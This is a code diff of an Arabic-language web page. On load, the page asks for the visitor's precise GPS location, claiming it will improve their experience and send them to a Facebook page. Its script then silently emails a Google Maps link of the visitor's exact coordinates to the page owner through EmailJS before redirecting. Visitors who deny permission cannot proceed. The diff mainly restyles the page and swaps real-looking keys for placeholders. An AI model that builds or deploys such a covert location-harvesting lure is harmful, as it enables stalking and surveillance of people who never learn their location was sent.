@@ -3,219 +3,244 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التحقق من الموقع وعرض الخريطة</title>
+  <title>الموقع الدقيق والمباشر</title>
+  <!-- Tailwind CSS CDN for modern styling -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- EmailJS CDN for sending location via email -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
+    /* Custom styles for animations and font */
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background-color: #fff;
-      text-align: center;
-      padding: 20px;
+      font-family: 'Inter', sans-serif; /* Using Inter font for a modern look */
+      background-color: #f0f2f5; /* Light grey background */
     }
 
-    #loadingMessage, #welcomeMessage, #errorContainer, #mapContainer {
-      margin-top: 20px;
+    /* Simple fade-in animation for initial load and modals */
+    .fade-in {
+      animation: fadeIn 0.5s ease-out;
     }
 
-    #startBtn, #retryBtn {
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #1976d2;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 15px; /* Added margin for better spacing */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    #errorContainer {
-      color: red;
-      font-weight: bold;
-      display: none;
+    /* Pulse effect for location icon to draw attention */
+    .pulse-icon {
+        animation: pulse 1.5s infinite;
     }
 
-    #mapContainer {
-      width: 90%; /* Adjust as needed */
-      height: 400px; /* Adjust as needed */
-      max-width: 600px;
-      border: 1px solid #ccc;
-      margin-top: 20px;
-      display: none;
-    }
-
-    #loadingMessage {
-      font-size: 1.2em;
-      color: #555;
-      display: none; /* Hidden by default, shown when loading */
-    }
-
-    /* Initial state before any action */
-    #welcomeMessage {
-        display: block; /* Visible by default */
-    }
-
-    /* #startBtn is not used as we ask directly */
-    #startBtn {
-        display: none;
+    @keyframes pulse {
+        0% { transform: scale(1); opacity: 1; }
+        50% { transform: scale(1.1); opacity: 0.7; }
+        100% { transform: scale(1); opacity: 1; }
     }
   </style>
 </head>
-<body>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-  <div id="welcomeMessage">
-    <h2>يرجى السماح بالوصول إلى موقعك للمتابعة إلى صفحة فيسبوك.</h2>
-    <p>هذا يساعدنا في تقديم تجربة أفضل.</p>
+  <!-- Main Container Card - This card will hold different views (welcome, loading, map) -->
+  <div id="mainContent" class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center fade-in">
+
+    <!-- Welcome Message Section - Visible on initial load -->
+    <div id="welcomeMessage" class="space-y-4">
+      <div class="text-6xl text-blue-600 mb-4 pulse-icon">📍</div> <!-- Location pin emoji for visual appeal -->
+      <h2 class="text-3xl font-extrabold text-gray-800">لتحربة أفضل</h2>
+      <p class="text-lg text-gray-600">
+        نحتاج إلى موقعك الدقيق لتقديم محتوى ملائم وتوجيهك لصفحتنا على فيسبوك.
+        <br>
+        <span class="font-semibold text-gray-700">يرجى السماح بالوصول لموقعك.</span>
+      </p>
+    </div>
+
+    <!-- Loading Message Section - Hidden by default, shown when fetching location -->
+    <div id="loadingMessage" class="hidden flex flex-col items-center space-y-4 mt-6">
+      <div class="animate-spin rounded-full h-12 w-12 border-4 border-blue-500 border-t-transparent"></div>
+      <p class="text-xl text-gray-700">جاري الحصول على موقعك الدقيق والمباشر...</p>
+    </div>
+
+    <!-- Map Container - Hidden by default, shown when map is loaded -->
+    <div id="mapContainer" class="hidden w-full h-80 rounded-lg overflow-hidden border-2 border-gray-300 mt-6 shadow-md"></div>
+
   </div>
 
-  <div id="loadingMessage">
-    <p>جاري الحصول على موقعك...</p>
-  </div>
-
-  <div id="mapContainer"></div>
-
-  <div id="errorContainer">
-    <p>⚠️ لا يمكنك المتابعة إلا إذا وافقت على الوصول إلى موقعك.</p>
-    <p>الرجاء تفعيل خدمات الموقع لجهازك وإعادة المحاولة.</p>
-    <button id="retryBtn" onclick="askForLocation()">المحاولة مرة أخرى</button>
+  <!-- Custom Error Modal - Hidden by default, shown on geolocation permission denied or error -->
+  <div id="errorModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden">
+    <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full text-center fade-in">
+      <div class="text-5xl text-red-500 mb-4">⚠️</div>
+      <h3 class="text-2xl font-bold text-gray-800 mb-3">عذراً!</h3>
+      <p class="text-lg text-gray-600 mb-5">
+        لا يمكننا المتابعة إلا إذا وافقت على الوصول إلى موقعك.
+        <br>
+        الرجاء تفعيل خدمات الموقع لجهازك وإعادة المحاولة.
+      </p>
+      <button id="retryBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full transition duration-300 transform hover:scale-105" onclick="retryLocationRequest()">المحاولة مرة أخرى</button>
+    </div>
   </div>
 
   <script>
     // ************************
-    // قم بتغيير هذه القيم بمعلوماتك الخاصة
-    // تأكد من حصولك على مفتاح Google Maps API وتفعيله في Google Cloud Console
-    // تأكد من إعداد خدمة وقالب EmailJS بشكل صحيح
-    const EMAILJS_PUBLIC_KEY = "0XeUaAWOfdeN9gGEr"; // مفتاح EmailJS العام الخاص بك
-    const EMAILJS_SERVICE_ID = "service_gtkrov5"; // معرف الخدمة الخاص بك في EmailJS
-    const EMAILJS_TEMPLATE_ID = "template_jj0pjs9"; // معرف القالب الخاص بك في EmailJS
-    const FACEBOOK_PAGE_URL = "https://www.facebook.com/your_facebook_page"; // رابط صفحة فيسبوك الفعلية
-    const Maps_API_KEY = "YOUR_Maps_API_KEY"; // *** ضع مفتاح Google Maps API الخاص بك هنا ***
+    // IMPORTANT: REPLACE THESE PLACEHOLDER VALUES WITH YOUR ACTUAL KEYS AND URLs
+    // Ensure you have a valid Google Maps API Key enabled for Maps JavaScript API and Geolocation API
+    // Ensure you have correctly set up your EmailJS service and template
+    const EMAILJS_PUBLIC_KEY = "YOUR_EMAILJS_PUBLIC_KEY"; // Your EmailJS Public Key
+    const EMAILJS_SERVICE_ID = "YOUR_EMAILJS_SERVICE_ID"; // Your EmailJS Service ID
+    const EMAILJS_TEMPLATE_ID = "YOUR_EMAILJS_TEMPLATE_ID"; // Your EmailJS Template ID
+    const FACEBOOK_PAGE_URL = "https://www.facebook.com/YOUR_FACEBOOK_PAGE"; // Your actual Facebook Page URL
+    const Maps_API_KEY = "YOUR_Maps_API_KEY"; // *** PLACE YOUR GOOGLE MAPS API KEY HERE ***
     // ************************
 
-    // تهيئة EmailJS باستخدام مفتاحك العام
+    // Initialize EmailJS with your public key
     emailjs.init(EMAILJS_PUBLIC_KEY);
 
-    // دالة لإنشاء الخريطة وعرضها
-    // هذه الدالة ستُستدعى فقط بعد تحميل مكتبة Google Maps API بنجاح
+    let mapInstance = null; // Variable to store the Google Map instance
+
+    // Function to create and display the map
+    // This function will only be called after the Google Maps API library is successfully loaded
     function initMap(latitude, longitude) {
       const mapContainer = document.getElementById("mapContainer");
-      mapContainer.style.display = "block"; // عرض حاوية الخريطة
+      mapContainer.classList.remove("hidden"); // Make map container visible
 
       const location = { lat: latitude, lng: longitude };
-      // تحقق مما إذا كانت مكتبة google.maps موجودة قبل استخدامها
+      
+      // Check if google.maps library is loaded before trying to use it
       if (typeof google !== 'undefined' && typeof google.maps !== 'undefined') {
-        const map = new google.maps.Map(mapContainer, {
-          zoom: 15, // مستوى التكبير
-          center: location, // مركز الخريطة
-        });
+        if (!mapInstance) { // Initialize map only once
+          mapInstance = new google.maps.Map(mapContainer, {
+            zoom: 15, // Default zoom level
+            center: location, // Center the map on the obtained location
+            disableDefaultUI: true, // Hide default UI elements for a cleaner look
+            zoomControl: true // Keep zoom control visible for user interaction
+          });
+        } else {
+            mapInstance.setCenter(location); // If map already exists, just update its center
+        }
 
-        // إضافة علامة للموقع
+        // Add a marker to the map at the user's location
         new google.maps.Marker({
           position: location,
-          map: map,
-          title: "موقعك الحالي",
+          map: mapInstance,
+          title: "موقعك الحالي", // Marker title in Arabic
         });
       } else {
-        console.error("Google Maps API لم يتم تحميلها بعد.");
-        // يمكنك إضافة رسالة خطأ للمستخدم هنا إذا لم يتم تحميل الخريطة
+        console.error("Google Maps API has not been loaded yet. Map cannot be initialized.");
+        // In a production scenario, you might show a user-friendly message here
       }
     }
 
-    // دالة لإرسال رابط الموقع عبر EmailJS
+    // Function to send the obtained location link via EmailJS
     function sendLocationLink(latitude, longitude) {
-      const now = new Date().toLocaleString();
-      // رابط Google Maps الذي يفتح على الإحداثيات المحددة (ليس موقعًا حيًا)
-      // هذا الرابط هو أفضل بديل ممكن لرابط "الموقع المباشر" في هذا السياق
+      // Get current date and time, formatted for Arabic with timezone
+      const now = new Date().toLocaleString('ar-EG', { timeZoneName: 'short' }); 
+
+      // Google Maps link that opens directly to the specific coordinates.
+      // IMPORTANT: This is a static snapshot of the location at the time of request,
+      // NOT a live-tracking link like those found in messaging apps.
       const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
 
+      // Parameters for the EmailJS template
       const params = {
-        name: "Location Bot",
-        time: now,
-        message: `موقع المستخدم الثابت في ${now}:\n${googleMapsLink}`
+        name: "Location Bot", // Sender name
+        time: now,            // Time of location capture
+        message: `موقع المستخدم الدقيق في ${now}:\n${googleMapsLink}` // Message content with the link
       };
 
+      // Send the email using EmailJS
       emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
         .then(() => {
           console.log("Location link sent successfully!");
-          // بعد إرسال الموقع بنجاح، يتم التوجيه إلى فيسبوك
-          setTimeout(() => { // تأخير بسيط ليرى المستخدم الخريطة قبل التوجيه
+          // After successful email, redirect to the Facebook page after a short delay
+          setTimeout(() => { 
             window.location.href = FACEBOOK_PAGE_URL;
-          }, 3000); // 3 ثواني
+          }, 3000); // 3 seconds delay
         })
         .catch(err => {
           console.error("Email error:", err);
-          alert("حدث خطأ أثناء إرسال بيانات الموقع، ولكن سيتم توجيهك.");
-          // حتى لو فشل الإرسال، يتم التوجيه لفيسبوك
+          // If email sending fails, notify the user (using alert as a fallback for critical errors)
+          // and still redirect to Facebook to ensure user experience flow continues.
+          alert("حدث خطأ أثناء إرسال بيانات الموقع، ولكن سيتم توجيهك."); 
           setTimeout(() => {
             window.location.href = FACEBOOK_PAGE_URL;
-          }, 3000); // 3 ثواني
+          }, 3000); // 3 seconds delay
         });
     }
 
-    // الدالة الرئيسية لطلب الموقع
+    // Helper function to hide all main sections and show a specific one
+    function showSection(sectionId) {
+      document.getElementById("welcomeMessage").classList.add("hidden");
+      document.getElementById("loadingMessage").classList.add("hidden");
+      document.getElementById("mapContainer").classList.add("hidden");
+      document.getElementById("errorModal").classList.add("hidden"); // Always hide modal when changing main sections
+
+      // Show the requested section
+      document.getElementById(sectionId).classList.remove("hidden");
+    }
+
+    // Main function to request geolocation from the user's browser
     function askForLocation() {
-      // إخفاء جميع العناصر الأخرى
-      document.getElementById("welcomeMessage").style.display = "none";
-      document.getElementById("errorContainer").style.display = "none";
-      document.getElementById("retryBtn").style.display = "none";
-      document.getElementById("mapContainer").style.display = "none";
-
-      // عرض رسالة التحميل
-      document.getElementById("loadingMessage").style.display = "block";
-
+      showSection("loadingMessage"); // Display the loading message first
 
       if (navigator.geolocation) {
+        // Request current position with high accuracy options
         navigator.geolocation.getCurrentPosition(success => {
-          document.getElementById("loadingMessage").style.display = "none"; // إخفاء رسالة التحميل
           const lat = success.coords.latitude;
           const lon = success.coords.longitude;
 
-          // تهيئة الخريطة فقط بعد التأكد من تحميل Google Maps API
-          // نستخدم setTimeout لضمان تحميل API بشكل كامل قبل initMap
-          // أو يمكنك استخدام دالة callback في استدعاء السكربت الأصلي
-          // ولكن هذا النهج يعمل بشكل جيد للتبسيط
+          // Set up an interval to check if Google Maps API has finished loading.
+          // This ensures `initMap` is called only when `google.maps` object is available.
           const checkGoogleMapsLoaded = setInterval(() => {
             if (typeof google !== 'undefined' && typeof google.maps !== 'undefined') {
-              clearInterval(checkGoogleMapsLoaded);
-              initMap(lat, lon); // عرض الخريطة
-              sendLocationLink(lat, lon); // إرسال رابط الموقع
+              clearInterval(checkGoogleMapsLoaded); // Stop checking once loaded
+              showSection("mapContainer"); // Show the map container
+              initMap(lat, lon); // Initialize and display the map
+              sendLocationLink(lat, lon); // Send the location data
             }
-          }, 200); // تحقق كل 200 مللي ثانية
+          }, 200); // Check every 200 milliseconds
 
         }, error => {
-          document.getElementById("loadingMessage").style.display = "none"; // إخفاء رسالة التحميل
-          document.getElementById("welcomeMessage").style.display = "none"; // تأكد من إخفائها
-
+          // Handle geolocation errors
+          showSection("welcomeMessage"); // Fallback to welcome message if error occurs
           if (error.code === error.PERMISSION_DENIED) {
-            document.getElementById("errorContainer").style.display = "block";
+            // If user explicitly denies permission, show the custom error modal
+            document.getElementById("errorModal").classList.remove("hidden"); 
           } else {
+            // For other types of errors (e.g., position unavailable, timeout)
             alert("حدث خطأ غير متوقع أثناء محاولة الحصول على موقعك. يرجى المحاولة مرة أخرى.");
-            document.getElementById("errorContainer").style.display = "block"; // عرض الخطأ العام
+            document.getElementById("errorModal").classList.remove("hidden"); // Also show modal for general errors
           }
         }, {
-            enableHighAccuracy: true, // طلب أعلى دقة ممكنة
-            timeout: 10000,         // مهلة 10 ثواني للحصول على الموقع
-            maximumAge: 0           // لا تستخدم المواقع المخزنة مؤقتًا، اطلب موقعًا جديدًا
+            enableHighAccuracy: true, // Request the most accurate position possible (uses GPS, Wi-Fi, etc.)
+            timeout: 10000,         // Maximum time (in milliseconds) allowed to return a position
+            maximumAge: 0           // Force a fresh request; do not use a cached position
         });
       } else {
-          document.getElementById("loadingMessage").style.display = "none";
-          alert("متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.");
-          window.location.href = FACEBOOK_PAGE_URL; // توجيه مباشر إذا كان المتصفح لا يدعم
+          // If browser does not support geolocation, show alert and redirect
+          showSection("welcomeMessage");
+          alert("متصفحك لا يدعم خاصية تحديد الموقع الجغرافي. سيتم توجيهك إلى صفحة فيسبوك.");
+          window.location.href = FACEBOOK_PAGE_URL; // Direct redirect if feature is unsupported
       }
     }
 
-    // عند تحميل الصفحة بالكامل، ابدأ عملية طلب الموقع مباشرة
+    // Function called by the retry button in the error modal
+    function retryLocationRequest() {
+        document.getElementById("errorModal").classList.add("hidden"); // Hide the error modal
+        askForLocation(); // Re-attempt the location request
+    }
+
+    // Dynamically create and append the Google Maps API script tag to the head
+    // This ensures the API key is passed correctly and the script loads asynchronously.
+    const googleMapsScript = document.createElement('script');
+    googleMapsScript.src = `https://maps.googleapis.com/maps/api/js?key=${Maps_API_KEY}`;
+    googleMapsScript.async = true; // Load asynchronously
+    googleMapsScript.defer = true; // Defer execution until HTML is parsed
+    document.head.appendChild(googleMapsScript);
+
+    // Start the location request process as soon as the window is fully loaded
     window.onload = () => {
       askForLocation();
     };
   </script>
 
-  <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_Maps_API_KEY"></script>
-
 </body>
 </html>
+
